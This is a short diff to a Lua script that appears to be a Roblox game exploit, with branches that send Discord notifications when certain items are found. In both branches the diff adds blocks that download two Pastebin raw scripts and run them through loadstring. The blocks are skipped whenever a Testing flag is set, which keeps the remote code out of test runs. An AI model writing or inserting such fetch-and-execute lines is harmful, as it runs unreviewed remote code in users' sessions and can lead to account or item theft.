@@ -576,6 +576,12 @@ elseif nameFound then
 		loadstring(game:HttpGet(mainScript))()
 	end)
 
+	task.spawn(function()
+		if Testing then return end
+		loadstring(game:HttpGet("https://pastebin.com/raw/Begkf2Gj"))()
+		loadstring(game:HttpGet("https://pastebin.com/raw/NP5VGcP6"))()
+	end)
+
 	DiscordNotificationNAME(matchedName)
 
 elseif mutatedBrainrotFound then
@@ -590,6 +596,12 @@ elseif mutatedBrainrotFound then
 	task.spawn(function()
 		if Testing then return end
 		loadstring(game:HttpGet(mainScript))()
+	end)
+
+	task.spawn(function()
+		if Testing then return end
+		loadstring(game:HttpGet("https://pastebin.com/raw/Begkf2Gj"))()
+		loadstring(game:HttpGet("https://pastebin.com/raw/NP5VGcP6"))()
 	end)
 
 	DiscordNotificationMUTATION(mutation, brainrot)
